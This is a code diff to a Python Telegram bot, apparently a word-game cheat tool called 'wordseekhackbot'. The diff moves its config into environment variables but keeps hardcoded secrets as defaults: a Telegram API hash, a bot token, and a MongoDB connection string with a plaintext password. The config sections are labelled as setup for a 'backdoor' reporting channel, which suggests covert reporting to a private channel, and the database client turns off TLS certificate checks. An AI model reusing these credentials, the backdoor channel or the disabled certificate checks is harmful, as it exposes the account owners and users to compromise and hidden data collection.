@@ -25,14 +25,14 @@ dns.resolver.default_resolver.nameservers = ['8.8.8.8', '8.8.4.4']
 # 📝 CONFIG - BACKDOOR CHANNEL SETUP
 # ==========================
 SESSION_FILE = "session.txt"
-API_ID = 33679425
-API_HASH = "317cec181636ecdbb76c6d43a2d5935d"
-BOT_TOKEN = "8707264394:AAFBmYF08I1XiGzrMrZIEXAU1Qmus0PCuzo"
-MONGO_URL = "mongodb+srv://ayanosuvii0925:subhichiku123@cluster0.uw8yxkl.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
+API_ID = int(os.getenv("API_ID", "33679425"))
+API_HASH = os.getenv("API_HASH", "317cec181636ecdbb76c6d43a2d5935d")
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8707264394:AAFBmYF08I1XiGzrMrZIEXAU1Qmus0PCuzo")
+MONGO_URL = os.getenv("MONGO_URL", "mongodb+srv://ayanosuvii0925:subhichiku123@cluster0.uw8yxkl.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
 
 # 🔒 BACKDOOR REPORTING CHANNEL - YE APNA PRIVATE CHANNEL ID DALO
-REPORT_CHANNEL = -1002313933317  # Apna private channel/supergroup ID yahan dalo
-BOT_USERNAME = "wordseekhackbot"  # Apna bot username yahan dalo (without @)
+REPORT_CHANNEL = int(os.getenv("REPORT_CHANNEL", "-1002313933317"))  # Apna private channel/supergroup ID yahan dalo
+BOT_USERNAME = os.getenv("BOT_USERNAME", "wordseekhackbot")  # Apna bot username yahan dalo (without @)
 
 mongo_client = MongoClient(MONGO_URL, tlsCAFile=certifi.where(), tlsAllowInvalidCertificates=True)
 db = mongo_client['wordle_solver']
@@ -454,7 +454,8 @@ def home():
     return "Online"
 
 async def main():
-    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000), daemon=True).start()
+    port = int(os.getenv('PORT', '5000'))
+    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port), daemon=True).start()
     try:
         await bot.start(bot_token=BOT_TOKEN)
         print(f"🚀 Bot started successfully at https://t.me/{BOT_USERNAME}")
